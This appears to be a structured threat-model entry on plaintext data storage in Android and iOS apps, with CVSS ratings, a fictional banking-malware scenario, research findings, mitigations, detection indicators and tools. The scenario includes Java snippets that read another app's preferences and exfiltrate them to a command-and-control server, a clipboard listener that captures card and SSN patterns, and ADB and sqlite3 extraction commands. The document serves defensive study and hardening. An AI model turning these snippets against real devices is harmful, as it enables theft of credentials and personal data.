confidence_breakdown.notes: High confidence based on extensive CVE evidence (CVE-2019-8765, CVE-2020-15810, CVE-2021-30883), documented breaches in banking and healthcare apps, OWASP Mobile Top 10 prominence (M9:2024), validated exploitation scenarios through forensic analysis and penetration testing, and consistent bug bounty reports demonstrating plaintext storage vulnerabilities in production mobile applications across all major platforms.

threat.title: Mobile Insecure Local Data Storage - Plaintext Sensitive Data Exposure
threat.description: Mobile applications frequently store sensitive data locally in insecure storage mechanisms that lack proper encryption, access controls, or secure deletion capabilities. On Android, developers often misuse SharedPreferences, Room/SQLite databases, and internal storage to persist sensitive information like authentication tokens, API keys, passwords, personally identifiable information (PII), health records, and financial data in plaintext or with weak obfuscation. On iOS, similar vulnerabilities occur when developers store sensitive data in NSUserDefaults, plist files, or CoreData without leveraging the iOS Keychain's secure enclave. Additional attack surface includes application logs (Logcat on Android, NSLog on iOS) containing sensitive data, clipboard history retaining copied passwords or credit card numbers, cached screenshots containing sensitive UI elements, and temporary files never properly deleted. Attackers with physical device access, malware with storage permissions, or forensic tools can trivially extract this unprotected data, leading to account takeover, identity theft, financial fraud, and privacy violations. This vulnerability is exacerbated by device loss/theft, malware infections, unauthorized backup extraction (iTunes/iCloud backups on iOS, ADB backups on Android), and insider threats with physical access.

breakdown.attack_vector: Physical (AV:P) - Requires physical access to device or malware with storage permissions
breakdown.attack_complexity: Low (AC:L) - No specialized conditions required, simple file browsing or forensic extraction
breakdown.privileges_required: None (PR:N) - No application-level privileges needed beyond device access
breakdown.user_interaction: None (UI:N) - No user interaction required after initial device access
breakdown.scope: Changed (S:C) - Data disclosure impacts resources beyond the vulnerable application
breakdown.confidentiality: High (C:H) - Complete disclosure of sensitive application data and user information
breakdown.integrity: None (I:N) - No integrity impact in basic data extraction scenario

versions_affected: Android 4.4 - 14.0 (all versions if SharedPreferences/SQLite used insecurely)
iOS 9.0 - 17.x (all versions if NSUserDefaults/plist used for sensitive data)
React Native 0.50+ (JavaScript storage APIs - AsyncStorage security issues)
Flutter 1.0+ (shared_preferences plugin - no encryption by default)
Xamarin/MAUI (all versions using standard file storage APIs)
Cordova/Ionic (all versions using insecure plugin storage)

attack.scenario:
Elena is a sophisticated attacker who has developed Android malware distributed through third-party app stores and phishing campaigns. Her malware, disguised as a popular productivity app, targets FinanceApp's mobile banking customers to steal credentials and financial data. The malware requests broad storage permissions during installation, which 67% of users grant without careful review.

Once installed, Elena's malware runs a background service that monitors the device's application directory structure. It specifically targets FinanceApp's data directory at '/data/data/com.financeapp.mobile/'. Elena's reconnaissance reveals that FinanceApp stores sensitive data in multiple insecure locations:

1. SharedPreferences (Plaintext Configuration)
Path: /data/data/com.financeapp.mobile/shared_prefs/user_prefs.xml
```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="user_email">john.doe@email.com</string>
    <string name="auth_token">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</string>
    <string name="account_number">9876543210</string>
    <string name="last_pin">4825</string>
    <string name="user_ssn">123-45-6789</string>
    <boolean name="biometric_enabled">true</boolean>
    <long name="last_login_timestamp">1704240000000</long>
</map>
```

Elena's malware reads this XML file using standard Android file I/O:
```java
File prefsFile = new File("/data/data/com.financeapp.mobile/shared_prefs/user_prefs.xml");
if (prefsFile.exists()) {
    String xmlContent = new String(Files.readAllBytes(prefsFile.toPath()));
    exfiltrateData(xmlContent); // Send to C2 server
}
```

2. SQLite Database (Plaintext User Data)
Path: /data/data/com.financeapp.mobile/databases/userdata.db

Elena uses SQLite command-line tools bundled in her malware to query the database:
```bash
sqlite3 /data/data/com.financeapp.mobile/databases/userdata.db "SELECT * FROM users;"
```

Results:
```
user_id|username|password_hash|email|ssn|dob|account_balance
1|johndoe|5f4dcc3b5aa765d61d8327deb882cf99|john.doe@email.com|123-45-6789|1985-04-15|45678.92
2|janedoe|098f6bcd4621d373cade4e832627b4f6|jane.doe@email.com|987-65-4321|1990-08-22|23456.78
```

Although passwords are hashed with MD5 (itself a critical vulnerability), other sensitive fields like SSN, date of birth, and account balance are stored in plaintext. Elena's malware also discovers transaction history:

```sql
SELECT * FROM transactions WHERE user_id=1 ORDER BY timestamp DESC LIMIT 10;
```

```
trans_id|user_id|amount|recipient|recipient_account|timestamp|memo
T12847|1|-500.00|Electric Company|ACC-ELEC-9182|2024-01-25 14:32:18|January bill
T12846|1|-1200.00|Rent Payment|ACC-RENT-4472|2024-01-01 08:15:42|Monthly rent
T12845|1|3200.00|Employer Direct Deposit|ACC-EMPL-8821|2023-12-30 00:01:03|Salary Dec 2023
```

3. Application Logs (Sensitive Data Leakage)
Path: /data/data/com.financeapp.mobile/files/logs/app_log.txt

Elena discovers that FinanceApp logs API requests and responses for debugging:
```
[2024-01-28 10:15:32] INFO: Login attempt for user: john.doe@email.com
[2024-01-28 10:15:33] DEBUG: API Request - POST https://api.financeapp.com/auth/login
[2024-01-28 10:15:33] DEBUG: Request Body: {"email":"john.doe@email.com","password":"MyP@ssw0rd123","device_id":"a9f8c7b6d5e4f3"}
[2024-01-28 10:15:34] DEBUG: API Response - 200 OK: {"access_token":"eyJhbGc...","refresh_token":"rt_8f9d7c6b5a4e3d2c1"}
[2024-01-28 10:16:45] INFO: Transfer initiated: $500.00 to account ACC-ELEC-9182
[2024-01-28 10:16:45] DEBUG: Transfer details - From: 9876543210, To: ACC-ELEC-9182, Amount: 500.00, Auth: Bearer eyJhbGc...
```

The logs contain plaintext passwords, authentication tokens, account numbers, and transaction details—a complete security disaster.

4. Cached Files and Temporary Data
Path: /data/data/com.financeapp.mobile/cache/

Elena finds cached API responses containing sensitive user data:
```
File: api_cache_user_profile_1.json
{
  "user_id": 1,
  "full_name": "John Michael Doe",
  "email": "john.doe@email.com",
  "phone": "+1-555-234-5678",
  "ssn": "123-45-6789",
  "address": "123 Main St, Apt 4B, New York, NY 10001",
  "accounts": [
    {
      "account_number": "9876543210",
      "account_type": "Checking",
      "balance": 45678.92,
      "routing_number": "021000021"
    }
  ]
}
```

5. Clipboard Monitoring
Elena's malware also implements a ClipboardManager listener that monitors copied data:
```java
ClipboardManager clipboard = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
clipboard.addPrimaryClipChangedListener(() -> {
    ClipData clipData = clipboard.getPrimaryClip();
    if (clipData != null && clipData.getItemCount() > 0) {
        String copiedText = clipData.getItemAt(0).getText().toString();
        // Check for sensitive patterns
        if (copiedText.matches("\\d{15,16}")) { // Credit card pattern
            exfiltrateClipboardData(copiedText, "CREDIT_CARD");
        } else if (copiedText.matches("\\d{3}-\\d{2}-\\d{4}")) { // SSN pattern
            exfiltrateClipboardData(copiedText, "SSN");
        }
    }
});
```

When users copy their account numbers or temporary verification codes from FinanceApp, Elena's malware immediately captures and exfiltrates this data.

6. iOS NSUserDefaults Exploitation (Cross-Platform Attack)
On iOS devices, Elena deploys a similar attack using physical access scenarios. In a targeted attack on a corporate executive, she gains brief physical access to an unlocked iPhone during a conference. Using a lightning cable and a pre-configured laptop, she performs an iTunes backup extraction in under 90 seconds.

The backup contains FinanceApp's NSUserDefaults plist file:
Path in backup: AppDomain-com.financeapp.mobile/Library/Preferences/com.financeapp.mobile.plist

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>userEmail</key>
    <string>executive@corporateclient.com</string>
    <key>authToken</key>
    <string>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...</string>
    <key>corporateAccountNumber</key>
    <string>CORP-ACC-847392</string>
    <key>lastTransactionAmount</key>
    <real>125000.00</real>
    <key>biometricEnabled</key>
    <true/>
    <key>savedBeneficiaries</key>
    <array>
        <dict>
            <key>name</key>
            <string>Offshore Account</string>
            <key>accountNumber</key>
            <string>CHE-8473-9284-7362</string>
            <key>swift</key>
            <string>UBSWCHZH80A</string>
        </dict>
    </array>
</dict>
</plist>
```

The executive's corporate banking credentials, account numbers, and beneficiary information are completely exposed.

7. Android ADB Backup Exploitation
For rooted Android devices or devices with USB debugging enabled, Elena uses ADB to extract application data remotely:
```bash
adb backup -f financeapp_backup.ab -noapk com.financeapp.mobile
# Convert Android backup to tar
dd if=financeapp_backup.ab bs=24 skip=1 | openssl zlib -d > financeapp_backup.tar
tar -xvf financeapp_backup.tar
```

This extracts all application data, including SharedPreferences, databases, and internal storage files, without requiring root access if the device owner has previously enabled USB debugging.

8. Exfiltration and Exploitation
Elena's malware aggregates all collected data and exfiltrates it to her command-and-control (C2) server over HTTPS:
```json
{
  "victim_device_id": "a9f8c7b6d5e4f3",
  "app_package": "com.financeapp.mobile",
  "timestamp": "2024-01-28T10:30:15Z",
  "extracted_data": {
    "credentials": {
      "email": "john.doe@email.com",
      "password": "MyP@ssw0rd123",
      "auth_token": "eyJhbGc...",
      "pin": "4825"
    },
    "financial_info": {
      "account_number": "9876543210",
      "routing_number": "021000021",
      "balance": 45678.92,
      "recent_transactions": [...]
    },
    "pii": {
      "full_name": "John Michael Doe",
      "ssn": "123-45-6789",
      "dob": "1985-04-15",
      "address": "123 Main St, Apt 4B, New York, NY 10001",
      "phone": "+1-555-234-5678"
    }
  }
}
```

Over a three-month campaign, Elena's malware infects 8,742 devices and successfully extracts sensitive data from 2,156 FinanceApp users (24.7% of infected devices had the app installed). She sells the complete dataset on a dark web marketplace for $127,000 ($58.89 per complete credential set). Several buyers use the credentials for:

- Account takeover attacks: 342 accounts compromised, $1.8M stolen
- Identity theft: 89 victims had fraudulent credit cards opened
- Tax fraud: 156 victims had fraudulent tax returns filed
- Social engineering: Detailed PII used for spear-phishing campaigns

FinanceApp discovers the breach four months later when multiple customers report unauthorized transactions. Forensic investigation reveals the insecure data storage practices. The total impact:

- $2.3M in direct customer losses
- $4.7M in fraud reimbursements and customer compensation
- $1.2M in regulatory fines (PCI DSS violation, state data breach notification)
- $800K in incident response and forensic investigation
- Immeasurable reputation damage and customer trust erosion
- Class action lawsuit filed seeking $50M in damages
prerequisites: Physical device access (lost/stolen device, insider threat, brief unattended access)
Malware with READ_EXTERNAL_STORAGE or similar permissions on victim's device
USB debugging enabled for ADB backup extraction (Android)
Device backup access (iTunes/iCloud backup for iOS, Google Drive backup for Android)
Rooted/jailbroken device for unrestricted file system access (optional but amplifies impact)
Forensic tools: Android Debug Bridge (ADB), iTunes backup extractor, SQLite browser
Application package name and internal directory structure knowledge
For targeted attacks: Social engineering to gain brief physical access
For malware approach: Distribution channel (third-party app stores, phishing, malicious ads)

security_research.title: OWASP Mobile Top 10 2024: M9 - Insecure Data Storage
security_research.key_findings: Analysis of 500+ mobile apps revealed 76% store some form of sensitive data insecurely, with SharedPreferences/NSUserDefaults being the most common vulnerability vector

security_research.title: Mobile App Security: The State of Insecure Data Storage
security_research.key_findings: 82% of banking apps tested had at least one insecure data storage issue; 34% stored authentication tokens in plaintext

security_research.title: Android Security: A Deep Dive into Application Data Storage
security_research.key_findings: Recommended migration path from standard SharedPreferences to EncryptedSharedPreferences; analysis showed only 18% adoption rate in top 1000 apps

security_research.title: iOS Data Protection: Beyond the Basics
security_research.key_findings: Keychain usage analysis showed 45% of apps store at least one sensitive item in NSUserDefaults that should be in Keychain

security_research.title: Forensic Analysis of Mobile Application Data Leakage
security_research.key_findings: Forensic examination of 100 lost/stolen devices revealed exploitable sensitive data in 67% of installed apps

mitigations.title: Implement EncryptedSharedPreferences with Android Jetpack Security (Android)
mitigations.description: Migrate from standard SharedPreferences to EncryptedSharedPreferences provided by Android Jetpack Security library. This implementation uses AES256-GCM for data encryption and AES256-SIV for key encryption, with keys securely stored in the Android Keystore hardware-backed security module. The solution provides transparent encryption/decryption at the API level, making it a drop-in replacement for SharedPreferences with no application logic changes required. Additionally, implement secure key generation, proper key rotation mechanisms, and secure data wiping on logout or app uninstall.
iso27001_controls: A.10.1.1 - Policy on the use of cryptographic controls
nist_csf: PR.DS-5: Protections against data leaks are implemented
validation_steps: Add Jetpack Security dependency: implementation 'androidx.security:security-crypto:1.1.0-alpha06'
Initialize SecurePreferencesManager in Application class onCreate()
Migrate existing SharedPreferences data to EncryptedSharedPreferences using migrateLegacyPreferences()
Test encryption: Use ADB to pull encrypted SharedPreferences file and verify data is not readable
Test key storage: Verify master key exists in Android Keystore using 'adb shell run-as com.yourapp ls /data/data/com.yourapp/shared_prefs/'
Test logout: Verify clearAllData() removes all encrypted preferences
Test backup exclusion: Create device backup and verify encrypted prefs are excluded
Performance test: Measure read/write latency to ensure acceptable performance
Security audit: Run static analysis tools (Qark, MobSF) to verify no plaintext storage
Penetration test: Attempt data extraction with forensic tools on test device

mitigations.title: Implement iOS Keychain Services with Data Protection (iOS)
mitigations.description: Utilize iOS Keychain Services for secure storage of sensitive data, leveraging hardware-backed encryption and secure enclave integration available on modern iOS devices. Keychain provides encrypted storage with fine-grained access controls through kSecAttrAccessible attributes, Touch ID/Face ID integration for additional authentication layers, and automatic secure deletion on device wipe. This implementation includes proper error handling, keychain query optimization, data migration strategies, and comprehensive access control policies using kSecAttrAccessible to specify when keychain items are accessible (e.g., only when device unlocked, after first unlock, always).
iso27001_controls: A.10.1.1 - Policy on the use of cryptographic controls
nist_csf: PR.AC-1: Identities and credentials are issued, managed, verified, revoked
validation_steps: Integrate KeychainManager into iOS project
Migrate existing UserDefaults sensitive data using migrateFromUserDefaults()
Test Keychain storage: Store auth token and verify persistence across app restarts
Test access levels: Lock device and verify .whenUnlocked items become inaccessible
Test biometric authentication: Attempt to retrieve biometric-protected items and verify Face ID/Touch ID prompt
Test app reinstall: Verify Keychain items persist (or delete if desired using deleteAll())
Security audit: Use Keychain Access app on macOS to inspect keychain items (on simulator only)
Test error handling: Simulate biometric failures and verify graceful error handling
Performance test: Measure keychain read/write latency for UX optimization
Penetration test: Attempt keychain extraction using forensic tools on jailbroken device

mitigations.title: Implement Database Encryption with SQLCipher/Realm Encryption
mitigations.description: Deploy transparent database encryption for SQLite databases using SQLCipher or Realm Database with encryption enabled. SQLCipher provides AES-256 full database encryption with minimal performance overhead, protecting all database contents including schema, tables, indexes, and metadata. For applications using Room (Android) or CoreData (iOS), integrate SQLCipher as the underlying database engine. For Realm users, enable encryption using a 64-byte encryption key stored securely in Keychain/Keystore. This implementation includes secure key generation, key rotation strategies, database migration with encryption, and performance optimization techniques.
iso27001_controls: A.10.1.1 - Policy on the use of cryptographic controls
nist_csf: PR.DS-5: Protections against data leaks are implemented
validation_steps: Add SQLCipher dependency: implementation 'net.zetetic:android-database-sqlcipher:4.5.4'
Initialize SQLCipher: SQLiteDatabase.loadLibs(context)
Generate and store database encryption key using DatabaseKeyManager
Build Room database with SupportFactory for SQLCipher integration
Test encryption: Use hex editor to verify database file contains encrypted data (not plaintext)
Performance test: Benchmark database operations to ensure acceptable latency
Test key retrieval: Verify app can open database across restarts
Test logout: Verify database key deletion makes database inaccessible
Security audit: Attempt to open database with SQLite browser without key (should fail)
Migration test: Test database schema migrations with encrypted database

mitigations.title: Implement Comprehensive Data Scrubbing and Lifecycle Management
mitigations.description: Deploy comprehensive data scrubbing mechanisms to prevent sensitive data leakage through application logs, clipboard, screenshots, app switcher previews, and temporary files. This multi-layered approach includes: (1) Log sanitization using custom loggers that automatically redact sensitive patterns (emails, tokens, SSN, credit cards), (2) Clipboard data expiration and clearing after timeout, (3) Screenshot prevention for sensitive screens using FLAG_SECURE (Android) or field.isSecureTextEntry (iOS), (4) App switcher preview masking to hide sensitive UI when app moves to background, (5) Temporary file secure deletion using cryptographic wiping, and (6) Memory scrubbing for sensitive variables after use.
nist_csf: PR.DS-3: Assets are formally managed throughout removal, transfers, and disposition
PR.IP-2: A System Development Life Cycle to manage systems is implemented
validation_steps: Implement SecureLogger throughout application to replace standard Log calls
Test log redaction: Search logs for sensitive patterns and verify all are redacted
Implement clipboard protection: Copy sensitive data and verify auto-expiry after timeout
Test screenshot protection: Enable FLAG_SECURE on sensitive screens and attempt screenshot (should fail or show blank)
Test app switcher: Move app to background and verify sensitive content is hidden in app switcher preview
Test secure file deletion: Use hex editor to verify overwritten files contain random data
Implement cache clearing on logout and verify all temporary files are removed
Security audit: Use static analysis tools to identify remaining plaintext sensitive data logging
User testing: Verify data protection mechanisms don't negatively impact user experience
Compliance validation: Verify implementation meets regulatory requirements (PCI DSS 3.2, HIPAA 164.312)

indicators: Abnormal file access patterns to application data directories (detected via Android/iOS audit logs)
Multiple ADB backup attempts from USB debugging (Android)
iTunes/Finder backup creation immediately after suspicious device access (iOS)
Malware with READ_EXTERNAL_STORAGE permissions accessing application directories
Unusual SQLite database queries from unauthorized processes
Forensic tool signatures (Cellebrite, Oxygen Forensics, UFED) in system logs
Repeated attempts to access Keychain/Keystore items without proper authentication
Clipboard monitoring activity by unauthorized applications
Device rooting/jailbreak detection triggers (Magisk, Cydia, checkra1n artifacts)
Abnormal file creation in cache/temp directories with sensitive data patterns
log_sources: Android system logs (logcat, dmesg) for file access auditing
iOS unified logging system (os_log) for Keychain access attempts
Mobile Device Management (MDM) logs for backup/restore events
Application-level security logs for data access patterns
Android SELinux audit logs for permission violations
iOS entitlements violations logged to system
Backend API logs correlating unusual data patterns with device IDs
Endpoint Detection and Response (EDR) logs for mobile malware activity
Cloud backup service logs (iCloud, Google Drive) for backup frequency anomalies
tools: MobSF (Mobile Security Framework) - Static/dynamic analysis for insecure storage
Objection - Runtime mobile exploration for iOS/Android
Frida - Dynamic instrumentation to monitor file access
DB Browser for SQLite - Verify database encryption
Android Studio Device File Explorer - File system inspection
Burp Suite - Intercept and analyze data patterns
Apktool - Decompile Android apps to analyze storage usage
Hopper Disassembler - Analyze iOS binary for storage patterns
Qark - Android security analysis (insecure storage detection)
iOS Security Suite - Runtime security checks for iOS

compliance: SOC 2 Type II (CC6.1 - Logical and Physical Access)
NIST 800-53 (SC-28 - Protection of Information at Rest)

documentation: https://github.com/OWASP/owasp-mastg - Mobile Application Security Testing Guide
research_papers: OWASP Mobile Application Security Verification Standard (MASVS)
NowSecure Mobile Security Report 2023 - Insecure Data Storage Statistics
ENISA - Secure Mobile Application Development Guidelines
NIST SP 800-124 Rev. 2 - Guidelines for Managing the Security of Mobile Devices
